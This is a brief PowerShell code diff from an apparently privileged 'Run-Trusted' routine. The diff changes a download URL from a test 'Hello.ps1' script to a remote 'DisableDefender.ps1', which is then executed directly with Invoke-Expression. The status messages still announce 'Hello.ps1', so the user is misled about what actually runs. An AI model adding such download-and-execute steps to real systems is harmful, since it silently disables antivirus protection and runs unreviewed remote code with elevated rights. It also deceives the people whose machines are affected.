@@ -32,7 +32,7 @@ function Run-Trusted([String]$command) {
 $executeCommand = @"
 try {
   Write-Host 'Descargando Hello.ps1...'
-  \$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Angel-Rojas-ING/TEST/main/Hello.ps1' -UseBasicParsing -ErrorAction Stop
+  \$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1' -UseBasicParsing -ErrorAction Stop
   Write-Host 'Ejecutando Hello.ps1...'
   Invoke-Expression \$scriptContent.Content
 } catch {
